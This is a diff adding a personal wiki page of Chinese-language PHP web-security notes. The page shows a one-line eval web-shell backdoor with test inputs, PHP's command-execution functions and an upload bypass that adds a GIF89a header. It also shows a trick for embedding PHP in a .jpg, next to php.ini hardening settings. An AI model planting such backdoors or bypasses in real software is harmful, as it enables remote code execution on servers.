@@ -1,0 +1,142 @@
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <link rel="Stylesheet" type="text/css" href="/static/css/style.css">
+        <link rel="Stylesheet" type="text/css" href="/static/css/tango.css">
+        <title>php - Wiki | janes</title>
+        <meta name="keywords" content=""/>
+        <meta name="description" content=""/>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    </head>
+
+    <body>
+        <div id="container">
+            
+<div id="header">
+  <div id="post-nav"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/#WebSecurity">WebSecurity</a>&nbsp;»&nbsp;php</div>
+</div>
+<div class="clearfix"></div>
+<div id="title">php</div>
+  <div id="content">
+  <h2 id="_1">一句话后门</h2>
+<div class="hlcode"><pre><span class="x">$cmd = $_POST[&#39;cmd&#39;];                                                      </span>
+<span class="x">eval(&quot;$cmd;&quot;);</span>
+
+<span class="x">poc:</span>
+<span class="x">? cmd=echo phpinfo()  </span>
+<span class="x">? cmd=echo exec(&quot;ls -l&quot;)</span>
+</pre></div>
+
+
+<h2 id="_2">执行系统命令（命令注入攻击）</h2>
+<ul>
+<li>shell_exec()</li>
+</ul>
+<blockquote>
+<p>string shell_exec ( string $cmd )</p>
+</blockquote>
+<p>命令执行的输出。 如果执行过程中发生错误或者进程不产生输出，则返回 NULL。</p>
+<ul>
+<li>system()</li>
+</ul>
+<blockquote>
+<p>string system ( string $command [, int &amp;$return_var ］)</p>
+</blockquote>
+<p>成功则返回命令输出的结果， 失败则返回 FALSE</p>
+<ul>
+<li>exec() </li>
+</ul>
+<blockquote>
+<p>string exec( string $command [, array &amp;$output [, int &amp;$return_var ］)</p>
+</blockquote>
+<p>返回命令执行结果的最后一行内容</p>
+<ul>
+<li>passthru</li>
+</ul>
+<blockquote>
+<p>void passthru ( string $command [, int &amp;$return_var ］ )</p>
+</blockquote>
+<p>直接将结果输出到游览器,不返回任何值</p>
+<ul>
+<li>
+<p>popen()</p>
+</li>
+<li>
+<p>proc_open()</p>
+</li>
+<li>
+<p>`(反撇号)</p>
+</li>
+</ul>
+<div class="hlcode"><pre><span class="n">echo</span> <span class="err">`</span><span class="n">ls</span> <span class="o">-</span><span class="n">l</span><span class="err">`</span><span class="p">;</span>
+</pre></div>
+
+
+<p><strong> for security</strong></p>
+<ul>
+<li>php.ini</li>
+</ul>
+<div class="hlcode"><pre><span class="nx">safe_mode</span> <span class="o">=</span> <span class="nx">On</span>      <span class="err">#</span><span class="nx">safe</span> <span class="nx">mode</span>
+<span class="nx">safe_mode_exec_dir</span> <span class="o">=</span> <span class="err">/usr/local/php/bin/    #limit path</span>
+
+<span class="nx">disable_functions</span><span class="o">=</span><span class="s2">&quot;eval,phpinfo&quot;</span>
+</pre></div>
+
+
+<ul>
+<li>
+<p>使用escapeshellcmd()和escapeshellarg()函数阻止用户恶意在系统上执行命令</p>
+<ul>
+<li>
+<p>escapeshellcmd()针对的是执行的系统命令</p>
+</li>
+<li>
+<p>escapeshellarg()针对的是执行系</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="upload">upload</h2>
+<p><strong> bypass </strong></p>
+<ul>
+<li>文件头+GIF89a</li>
+</ul>
+<h2 id="dangerous-functions">dangerous functions</h2>
+<ul>
+<li>file_get_contents()</li>
+</ul>
+<blockquote>
+<p>string file_get_contents ( string $filename [, bool $use_include_path = false [, resource $context [, int $offset = -1 [, int $maxlen ]]]] )</p>
+</blockquote>
+<p>支持本地文件，HTTP，FTP</p>
+<p>禁用file_get_contents,修改php.ini</p>
+<div class="hlcode"><pre><span class="n">allow_url_fopen</span><span class="o">=</span><span class="n">Off</span>
+</pre></div>
+
+
+<ul>
+<li>curl</li>
+</ul>
+<p>支持 FTP(S),HTTP(S),TELNET,FILE,DICT,LDAP,GOPHER</p>
+<p>install: sudo apt-get install php5-curl. then restart apache</p>
+<h2 id="_3">备注</h2>
+<ul>
+<li>注入php 到图片等</li>
+</ul>
+<div class="hlcode"><pre><span class="nx">echo</span> <span class="s1">&#39;</span><span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">();</span><span class="cp">?&gt;</span><span class="s1">&#39;</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">.</span><span class="nx">jpg</span>
+</pre></div>
+
+
+<p>文件名后缀改为<strong>.php</strong>，就会用php方式解析，执行phpinfo().</p>
+</div>
+
+        </div>
+        <div id="footer">
+            <span>
+                Copyright © 2012-2016 .
+                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
+            </span>
+        </div>
+        
+    </body>
+</html>
